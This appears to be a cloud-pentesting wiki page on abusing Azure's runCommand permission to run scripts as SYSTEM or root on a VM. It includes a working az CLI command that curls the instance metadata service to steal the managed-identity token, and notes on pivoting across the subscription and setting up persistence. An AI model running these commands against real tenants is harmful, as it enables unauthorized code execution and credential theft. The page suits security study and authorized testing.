---
title: "Run command: SYSTEM or root execution with runCommand"
description: "Running commands as SYSTEM or root on an Azure VM with the runCommand action, without stored credentials."
keywords:
  - run command
  - runCommand
  - VM
  - SYSTEM
  - code execution
---

# Run command

The `Microsoft.Compute/virtualMachines/runCommand/action` right runs a script on a VM through the guest agent, as **SYSTEM** on Windows or **root** on Linux, with no credential on the host and no inbound network access needed. It is the fastest way to turn VM Contributor (or any role carrying run-command) into code execution on the box and, from there, the VM's managed-identity token.

## Executing

```bash
# Linux guest
az vm run-command invoke -g <rg> -n <vm> \
  --command-id RunShellScript --scripts "id; curl -s -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"

# Windows guest
az vm run-command invoke -g <rg> -n <vm> \
  --command-id RunPowerShellScript --scripts "whoami"
```

## Exploitation notes

- Output is returned inline through the management plane, so this works against a VM with no public IP and locked-down NSGs.
- The classic chain is run command to read the VM's [managed identity](managed-identity.md) token, then act across the subscription as that identity.
- Persisted run-command resources (`az vm run-command create`) stay attached and re-run, which is louder but durable.

## Tools

- **Azure CLI** (`az vm run-command invoke`).
- **MicroBurst** (`Invoke-AzureRmVMBulkCMD`): run a command across many VMs at once.

## References

- [Microsoft: Azure VM run command](https://learn.microsoft.com/azure/virtual-machines/run-command-overview)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
- [HackTricks Cloud: Azure VM run command](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
